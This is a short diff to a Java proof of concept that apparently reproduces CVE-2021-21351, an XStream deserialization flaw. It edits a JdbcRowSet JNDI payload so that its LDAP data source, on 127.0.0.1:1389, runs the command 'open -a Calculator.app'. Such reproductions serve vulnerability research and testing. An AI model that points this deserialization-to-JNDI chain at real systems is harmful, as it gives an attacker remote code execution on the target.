@@ -40,7 +40,7 @@ public class CVE_2021_21351 {
                 "                  <readOnly>true</readOnly>\n" +
                 "                  <rowSetType>1004</rowSetType>\n" +
                 "                  <showDeleted>false</showDeleted>\n" +
-                "                  <dataSource>ldap://127.0.0.1:23457/Command8</dataSource>\n" +
+                "                  <dataSource>ldap://127.0.0.1:1389/Basic/Command/open -a Calculator.app</dataSource>\n" +
                 "                  <listeners/>\n" +
                 "                  <params/>\n" +
                 "                </default>\n" +
@@ -85,5 +85,4 @@ public class CVE_2021_21351 {
         XStream xstream = new XStream();
         xstream.fromXML(xml);
     }
-
 }
